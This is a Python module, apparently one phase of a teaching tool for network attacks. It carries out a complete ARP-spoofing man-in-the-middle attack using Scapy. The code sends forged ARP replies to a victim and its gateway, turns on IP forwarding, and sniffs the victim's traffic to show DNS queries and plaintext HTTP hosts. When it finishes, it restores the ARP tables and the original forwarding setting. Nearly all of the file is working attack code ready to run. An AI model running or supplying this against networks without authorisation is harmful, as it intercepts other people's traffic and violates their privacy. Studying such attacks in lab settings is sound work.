"""
Phase 3 — ARP spoofing / Man-in-the-Middle.

Default backend: Scapy (works fully offline, no extra services).
Optional backend: bettercap (only if the user wants the nicer TUI).

Safety:
  • Always re-enables IP forwarding to its original state on exit.
  • Always restores victim's & gateway's ARP tables on exit (5 broadcasts).
  • Never runs without explicit confirmation in the caller.
"""

import os
import time
import threading
import subprocess
from typing import Optional

from .utils import COLORS, info, ok, warn, err

try:
    from scapy.all import (  # type: ignore
        ARP, Ether, IP, UDP, DNS, sendp, srp, sniff, conf,
    )
    SCAPY_OK = True
except Exception as e:                     # pragma: no cover
    SCAPY_OK = False
    _SCAPY_ERR = str(e)


# Module-level state for the emergency cleanup hook
_STATE = {
    "running":          False,
    "stop_event":       None,
    "victim_ip":        None,
    "victim_mac":       None,
    "gateway_ip":       None,
    "gateway_mac":      None,
    "iface":            None,
    "original_forward": None,
    "packets_seen":     0,
}


# ----------------------------------------------------------------------------
# Helpers
# ----------------------------------------------------------------------------
def _read_ip_forward() -> str:
    try:
        with open("/proc/sys/net/ipv4/ip_forward", "r") as f:
            return f.read().strip()
    except Exception:
        return "0"


def _write_ip_forward(value: str) -> None:
    try:
        with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
            f.write(value)
    except Exception as e:
        warn(f"Could not write ip_forward: {e}")


def _resolve_mac(ip: str, iface: str) -> Optional[str]:
    """ARP request to find the MAC of `ip`."""
    try:
        ans, _ = srp(
            Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip),
            timeout=3, iface=iface, verbose=0,
        )
        for _, rcv in ans:
            return rcv.hwsrc
    except Exception as e:
        err(f"Failed to ARP-resolve {ip}: {e}")
    return None


# ----------------------------------------------------------------------------
# Poisoning
# ----------------------------------------------------------------------------
def _poison_loop(stop_event: threading.Event) -> None:
    """Send forged ARP replies twice per second until told to stop."""
    s = _STATE
    pkt_to_victim = Ether(dst=s["victim_mac"]) / ARP(
        op=2, pdst=s["victim_ip"], hwdst=s["victim_mac"], psrc=s["gateway_ip"],
    )
    pkt_to_gateway = Ether(dst=s["gateway_mac"]) / ARP(
        op=2, pdst=s["gateway_ip"], hwdst=s["gateway_mac"], psrc=s["victim_ip"],
    )
    while not stop_event.is_set():
        try:
            sendp(pkt_to_victim,  iface=s["iface"], verbose=0)
            sendp(pkt_to_gateway, iface=s["iface"], verbose=0)
        except Exception as e:
            err(f"sendp error: {e}")
            break
        time.sleep(2)


def _restore_arp() -> None:
    """Send 5 LEGITIMATE ARP replies so victim & router relearn the truth."""
    s = _STATE
    if not all([s["victim_mac"], s["gateway_mac"], s["victim_ip"], s["gateway_ip"], s["iface"]]):
        return
    pkt_to_victim = Ether(dst=s["victim_mac"]) / ARP(
        op=2, pdst=s["victim_ip"], hwdst=s["victim_mac"],
        psrc=s["gateway_ip"], hwsrc=s["gateway_mac"],
    )
    pkt_to_gateway = Ether(dst=s["gateway_mac"]) / ARP(
        op=2, pdst=s["gateway_ip"], hwdst=s["gateway_mac"],
        psrc=s["victim_ip"], hwsrc=s["victim_mac"],
    )
    for _ in range(5):
        try:
            sendp(pkt_to_victim,  iface=s["iface"], verbose=0)
            sendp(pkt_to_gateway, iface=s["iface"], verbose=0)
        except Exception:
            pass
        time.sleep(0.5)


# ----------------------------------------------------------------------------
# Live observation while we're in the middle
# ----------------------------------------------------------------------------
def _observation_loop(stop_event: threading.Event, victim_ip: str, events: list) -> None:
    """
    Sniff packets going to/from the victim, surface DNS queries and
    plaintext HTTP hosts so students can see the impact in real time.
    """
    def _handle(pkt):
        s = _STATE
        if not pkt.haslayer(IP):
            return
        if pkt[IP].src != victim_ip and pkt[IP].dst != victim_ip:
            return
        s["packets_seen"] += 1

        # DNS questions are GOLD for the demo
        if pkt.haslayer(DNS) and pkt[DNS].qd is not None and pkt[DNS].qr == 0:
            try:
                qname = pkt[DNS].qd.qname.decode(errors="ignore").rstrip(".")
            except Exception:
                qname = "<decode error>"
            line = f"DNS  {pkt[IP].src} → {qname}"
            events.append(line)
            print(f"  {COLORS['ok']}🔍 {line}{COLORS['end']}")
            return

        # Plaintext HTTP Host header
        if pkt.haslayer("Raw"):
            try:
                payload = bytes(pkt["Raw"].load)
                if payload[:4] in (b"GET ", b"POST", b"HEAD") or b"HTTP/1." in payload[:32]:
                    text = payload[:512].decode("latin-1", errors="ignore")
                    host = ""
                    for ln in text.split("\r\n"):
                        if ln.lower().startswith("host:"):
                            host = ln.split(":", 1)[1].strip()
                            break
                    method = text.split(" ", 1)[0]
                    line = f"HTTP {method} → {host or '?'}"
                    events.append(line)
                    print(f"  {COLORS['warn']}🌐 {line}{COLORS['end']}")
            except Exception:
                pass

    bpf = f"host {victim_ip}"
    try:
        sniff(
            iface=_STATE["iface"],
            filter=bpf,
            prn=_handle,
            store=False,
            stop_filter=lambda *_: stop_event.is_set(),
            timeout=None,
        )
    except Exception as e:
        err(f"sniff error: {e}")


# ----------------------------------------------------------------------------
# Public entry points
# ----------------------------------------------------------------------------
def run_arp_spoof(victim_ip: str, gateway_ip: str, iface: str,
                  duration_sec: int = 60) -> list[str]:
    """
    Run a full ARP-spoof + observation session for `duration_sec` seconds.
    Returns a list of human-readable events for the report.
    """
    if not SCAPY_OK:
        err(f"Scapy is required for MITM. Import error: {_SCAPY_ERR}")
        err("Install with: sudo apt install python3-scapy   (or pip install scapy)")
        return []

    events: list[str] = []
    info(f"Resolving MAC of victim {victim_ip} ...")
    victim_mac = _resolve_mac(victim_ip, iface)
    if not victim_mac:
        err("Could not resolve victim MAC. Aborting.")
        return events

    info(f"Resolving MAC of gateway {gateway_ip} ...")
    gateway_mac = _resolve_mac(gateway_ip, iface)
    if not gateway_mac:
        err("Could not resolve gateway MAC. Aborting.")
        return events

    ok(f"Victim  MAC: {victim_mac}")
    ok(f"Gateway MAC: {gateway_mac}")

    # Enable IPv4 forwarding so we don't accidentally DoS the victim
    original_forward = _read_ip_forward()
    _write_ip_forward("1")
    info("IPv4 forwarding enabled (so the victim still has connectivity through us).")

    _STATE.update({
        "running":          True,
        "stop_event":       threading.Event(),
        "victim_ip":        victim_ip,
        "victim_mac":       victim_mac,
        "gateway_ip":       gateway_ip,
        "gateway_mac":      gateway_mac,
        "iface":            iface,
        "original_forward": original_forward,
        "packets_seen":     0,
    })

    poison_t = threading.Thread(target=_poison_loop, args=(_STATE["stop_event"],), daemon=True)
    sniff_t  = threading.Thread(target=_observation_loop,
                                args=(_STATE["stop_event"], victim_ip, events),
                                daemon=True)
    poison_t.start()
    sniff_t.start()

    print()
    ok(f"⚡ MITM active for {duration_sec}s — watch the live feed below ⚡")
    print(f"{COLORS['dim']}(Ctrl-C to stop early; cleanup is automatic){COLORS['end']}\n")

    start = time.time()
    try:
        while time.time() - start < duration_sec:
            time.sleep(1)
    except KeyboardInterrupt:
        warn("Stopping early at user request...")
    finally:
        _STATE["stop_event"].set()
        poison_t.join(timeout=3)
        sniff_t.join(timeout=3)
        info("Restoring ARP tables ...")
        _restore_arp()
        _write_ip_forward(original_forward)
        _STATE["running"] = False
        ok(f"Done. Packets observed crossing through us: {_STATE['packets_seen']}")

    events.append(f"Total packets observed: {_STATE['packets_seen']}")
    return events


def emergency_restore() -> None:
    """Called from the signal handler if the user Ctrl-Cs out of the program."""
    if _STATE.get("running"):
        warn("Emergency: restoring ARP tables and forwarding state...")
        if _STATE.get("stop_event"):
            _STATE["stop_event"].set()
        _restore_arp()
        if _STATE.get("original_forward") is not None:
            _write_ip_forward(_STATE["original_forward"])
        _STATE["running"] = False
